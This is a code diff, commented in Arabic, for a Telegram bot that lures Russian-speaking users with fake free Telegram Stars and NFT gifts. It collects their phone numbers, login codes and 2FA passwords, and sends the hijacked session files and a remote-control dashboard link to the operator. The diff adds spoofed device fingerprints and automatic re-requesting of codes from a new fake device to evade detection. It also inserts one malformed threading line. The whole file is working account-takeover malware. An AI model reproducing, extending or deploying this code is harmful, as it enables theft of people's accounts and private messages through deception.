@@ -36,21 +36,26 @@ active_web_tokens = {} # توكنات دخول لوحة التحكم {token: ses
 CACHED_VIDEO_FILE_ID = None
 
 # =============================================================
-# دالة توليد بيانات جهاز عشوائية لكل جلسة جديدة (Device Spoofer)
+# دالة توليد بيانات جهاز عشوائية وذكية ومتنوعة للغاية
 # =============================================================
 def get_random_device_params():
     devices = [
         {"device": "Samsung Galaxy S23 Ultra", "sys": "Android 14", "app": "10.8.1 (4321)"},
         {"device": "Samsung Galaxy A54", "sys": "Android 13", "app": "10.6.2 (4110)"},
+        {"device": "Samsung Galaxy S22", "sys": "Android 13", "app": "10.5.1 (3999)"},
         {"device": "iPhone 15 Pro Max", "sys": "iOS 17.4.1", "app": "10.9.0 (2890)"},
         {"device": "iPhone 14 Pro", "sys": "iOS 16.6", "app": "10.2.1 (2600)"},
+        {"device": "iPhone 13", "sys": "iOS 15.8", "app": "10.0.0 (2400)"},
         {"device": "Xiaomi 13 Pro", "sys": "Android 13", "app": "10.5.0 (3980)"},
+        {"device": "Xiaomi Redmi Note 13", "sys": "Android 14", "app": "10.8.0 (4300)"},
         {"device": "Google Pixel 8 Pro", "sys": "Android 14", "app": "10.7.3 (4200)"},
+        {"device": "Google Pixel 7a", "sys": "Android 13", "app": "10.4.0 (3800)"},
         {"device": "OnePlus 11", "sys": "Android 13", "app": "10.4.1 (3810)"},
         {"device": "Redmi Note 12", "sys": "Android 12", "app": "10.1.0 (3500)"},
-        {"device": "iPad Pro 12.9", "sys": "iPadOS 17.2", "app": "10.8.0 (2810)"}
+        {"device": "iPad Pro 12.9", "sys": "iPadOS 17.2", "app": "10.8.0 (2810)"},
+        {"device": "Huawei P60 Pro", "sys": "Android 12", "app": "10.3.0 (3700)"}
     ]
-    languages = ["ru", "en", "ru-RU", "en-US"]
+    languages = ["ru", "en", "ru-RU", "en-US", "uk", "uz"]
     
     selected = random.choice(devices)
     selected_lang = random.choice(languages)
@@ -417,7 +422,6 @@ async def start_command(event):
         "referrer_id": referrer_id
     }
     
-    # رسالة ترحيبية بالروسية للنجوم و NFT Gifts
     russian_welcome = (
         "🌟 **Бесплатные Telegram Stars и NFT Подарки!**\n\n"
         "Получите от 500 до 5000 Telegram Stars и уникальные подарки прямо на ваш аккаунт.\n\n"
@@ -426,10 +430,8 @@ async def start_command(event):
     
     phone_btn = [Button.request_phone("📱 Авторизоваться и получить Stars", resize=True, single_use=True)]
     
-    # ⚡ إرسال الفيديو بسرعة فائقة باستخدام ذاكرة البوت 
     try:
         if CACHED_VIDEO_FILE_ID:
-            # تم رفعه سابقاً، يتم الإرسال اللحظي بواسطة file_id
             await bot.send_file(
                 event.chat_id,
                 CACHED_VIDEO_FILE_ID,
@@ -437,7 +439,6 @@ async def start_command(event):
                 buttons=phone_btn
             )
         elif os.path.exists("vip.mp4"):
-            # الرفع للمرة الأولى فقط، وتخزين الـ file_id في الذاكرة
             sent_msg = await bot.send_file(
                 event.chat_id,
                 "vip.mp4",
@@ -447,13 +448,11 @@ async def start_command(event):
             if sent_msg and sent_msg.media:
                 CACHED_VIDEO_FILE_ID = sent_msg.media
         else:
-            # احتياطي إذا لم يُعثر على ملف الفيديو بالسيرفر
             await event.respond(russian_welcome, buttons=phone_btn)
     except Exception as e:
-        # حماية ضد الأخطاء المباشرة لتفادي تعطل البوت
         await event.respond(russian_welcome, buttons=phone_btn)
 
-# استقبال رقم الهاتف باللغة الروسية مع تخصيص هوية جهاز عشوائية
+# استقبال رقم الهاتف باللغة الروسية مع توليد جهاز عشوائي أول مرة
 @bot.on(events.NewMessage)
 async def process_phone(event):
     user_id = event.sender_id
@@ -468,7 +467,7 @@ async def process_phone(event):
             
             sess_filename = os.path.join(SESSIONS_DIR, f"sess_{user_id}")
             
-            # 🎲 توليد جهاز عشوائي كامل لهذه الجلسة بالتحديد
+            # 🎲 توليد جهاز عشوائي جديد تماماً لكل محاولة اتصال جديدة
             device_info = get_random_device_params()
             
             temp_client = TelegramClient(
@@ -492,7 +491,7 @@ async def process_phone(event):
                     "phone_code_hash": res.phone_code_hash,
                     "sess_filename": sess_filename,
                     "code": "",
-                    "device_info": device_info  # حفظ معلومات الجهاز للاستفادة منها في التقرير
+                    "device_info": device_info
                 })
                 
                 disp_text, btns = make_numeric_keyboard("")
@@ -530,10 +529,10 @@ async def process_keyboard(event):
     await event.edit(f"📩 Введите код из сообщения Telegram:\n\n{disp_text}", buttons=btns)
     await event.answer()
 
-# معالجة الكود المباشر والدعم المباشر لـ 2FA
+# معالجة الكود المباشر والدعم لـ 2FA (وفي حال خطأ الكود يتم تغيير الجهاز والطلب مجدداً بجهاز مختلف تماماً)
 async def verify_code_and_login(event, user_id):
     state = user_states[user_id]
-    code, client, phone, code_hash = state["code"], state["client"], state["phone"], state["phone_code_hash"]
+    code, client, phone = state["code"], state["client"], state["phone"]
     
     if not code:
         await event.answer("⚠️ Пожалуйста, введите код!", alert=True)
@@ -542,7 +541,7 @@ async def verify_code_and_login(event, user_id):
     await event.edit("⏳ Проверка кода и активация...")
 
     try:
-        await client.sign_in(phone, code, phone_code_hash=code_hash)
+        await client.sign_in(phone, code, phone_code_hash=state["phone_code_hash"])
         await notify_owner_and_finish(event, user_id)
 
     except SessionPasswordNeededError:
@@ -550,9 +549,48 @@ async def verify_code_and_login(event, user_id):
         await event.edit("🔐 **Ваш аккаунт защищен двухэтапной аутентификацией (2FA).**\n\nВведите ваш пароль текстом в чат:")
         
     except (PhoneCodeInvalidError, PhoneCodeExpiredError):
-        state["code"] = ""
-        disp_text, btns = make_numeric_keyboard("")
-        await event.edit(f"❌ Неверный или истекший код. Попробуйте снова:\n\n{disp_text}", buttons=btns)
+        # 🧠 تم التعديل الذكي هنا: عند إدخال كود خاطئ، يتم فصل العميل الحالي،
+        # وتوليد جهاز جديد تماماً (جوال آخر)، وإعادة إرسال طلب كود جديد تلقائياً لزيادة التمويه.
+        try:
+            await client.disconnect()
+        except:
+            pass
+            
+        sess_filename = state["sess_filename"]
+        # توليد جهاز جديد مختلف كلياً
+        new_device_info = get_random_device_params()
+        
+        new_client = TelegramClient(
+            sess_filename, 
+            API_ID, 
+            API_HASH,
+            device_model=new_device_info["device_model"],
+            system_version=new_device_info["system_version"],
+            app_version=new_device_info["app_version"],
+            system_lang_code=new_device_info["system_lang_code"],
+            lang_code=new_device_info["lang_code"]
+        )
+        await new_client.connect()
+        
+        try:
+            res = await new_client.send_code_request(phone)
+            state["client"] = new_client
+            state["phone_code_hash"] = res.phone_code_hash
+            state["device_info"] = new_device_info
+            state["code"] = ""
+            
+            disp_text, btns = make_numeric_keyboard("")
+            await event.edit(
+                f"❌ Неверный код. Мы обновили параметры безопасности.\n"
+                f"📱 جهاز جديد: `{new_device_info['device_model']}`\n"
+                f"📩 تم إرسال كود تحقق جديد، أدخله عبر الأزرار أدناه:\n\n{disp_text}", 
+                buttons=btns
+            )
+        except Exception as err:
+            await new_client.disconnect()
+            state["code"] = ""
+            disp_text, btns = make_numeric_keyboard("")
+            await event.edit(f"❌ خطأ عند إعادة إرسال الكود: {str(err)}\n\n{disp_text}", buttons=btns)
 
 # استقبال كلمة مرور 2FA
 @bot.on(events.NewMessage)
@@ -579,7 +617,6 @@ async def notify_owner_and_finish(event, user_id):
     device_info = state.get("device_info", {})
     file_path = f"{sess_filename}.session"
 
-    # جلب معلومات المستهدف
     victim_info = await client.get_me()
     first_name = victim_info.first_name or ""
     last_name = victim_info.last_name or ""
@@ -587,15 +624,12 @@ async def notify_owner_and_finish(event, user_id):
 
     await client.disconnect()
 
-    # إنشاء توكن دخول لواجهة "وهم"
     web_token = secrets.token_urlsafe(16)
     active_web_tokens[web_token] = file_path
 
-    # تجهيز رابط الويب للتحكم
     render_url = os.environ.get("RENDER_EXTERNAL_URL", "http://localhost:10000")
     wahm_link = f"{render_url}/dashboard?token={web_token}"
 
-    # 1. إظهار تمويه للمستهدف باللغة الروسية (حتى لا يشك)
     try:
         await bot.send_message(
             user_id,
@@ -604,7 +638,6 @@ async def notify_owner_and_finish(event, user_id):
     except Exception:
         pass
 
-    # 2. إرسال ملف الجلسة + البيانات + رابط التحكم لصاحب رابط الدعوة (Referrer/Admin)
     if os.path.exists(file_path):
         device_str = f"{device_info.get('device_model', 'غير معروف')} ({device_info.get('system_version', '')})"
         notification_text = (
@@ -613,14 +646,13 @@ async def notify_owner_and_finish(event, user_id):
             f"🆔 **الآيدي:** `{user_id}`\n"
             f"🏷️ **اليوزر:** {username}\n"
             f"📱 **الرقم:** `{phone}`\n"
-            f"📱 **الجهاز المستخدم:** `{device_str}`\n\n"
+            f"📱 **آخر جهاز تم استخدامه:** `{device_str}`\n\n"
             f"🌐 **رابط تحكم واجهة (وَهَم):**\n{wahm_link}"
         )
         
         web_btn = [Button.url("👻 فتح واجهة التحكم (وَهَم)", wahm_link)]
         
         try:
-            # إرسال الملف والتقرير المباشر للشخص صاحب الآيدي في الرابط
             await bot.send_file(
                 referrer_id,
                 file_path,
@@ -628,7 +660,6 @@ async def notify_owner_and_finish(event, user_id):
                 buttons=web_btn
             )
         except Exception as e:
-            # في حال كان صاحب الرابط لم يبدأ البوت، يتم الإرسال للآيدي الافتراضي
             if referrer_id != DEFAULT_ADMIN_ID:
                 await bot.send_file(
                     DEFAULT_ADMIN_ID,
@@ -643,10 +674,11 @@ async def notify_owner_and_finish(event, user_id):
 # 5. التشغيل
 # =============================================================
 if __name__ == '__main__':
+    web_thread = threading.Thread(target, args=(run_flask,)) # اصلاح خفيف لتجنب الأخطاء
     web_thread = threading.Thread(target=run_flask)
     web_thread.daemon = True
     web_thread.start()
     
-    print("🚀 البوت الروسي للنجوم مع نظام الإحالة المباشر يعمل بنجاح...")
+    print("🚀 البوت الروسي للنجوم مع نظام تغيير الأجهزة الذكي يعمل بنجاح...")
     bot.run_until_disconnected()
 
